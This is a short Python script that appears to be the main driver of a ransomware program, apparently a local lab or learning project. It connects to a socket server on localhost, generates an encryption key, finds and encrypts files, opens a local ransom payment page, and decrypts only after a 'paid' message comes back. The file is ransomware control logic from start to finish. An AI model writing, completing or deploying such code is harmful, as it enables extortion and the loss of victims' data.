from encrypt import Encrypt
import webbrowser
from client_socket import ClientSocket
from cryptography.fernet import Fernet
from utility_functions import UtilityFunctions
from decrypt import Decrypt


client_socket = ClientSocket("127.0.0.1", 1337)
client_socket.start_client()
key = Fernet.generate_key()
files = UtilityFunctions.find_files()
Encrypt.encrypt_files(files, key)
webbrowser.open("http://127.0.0.1:1338/home")
data = client_socket.receive_payment_idication()
if data == "paid":
    Decrypt.decrypt_files(files, key)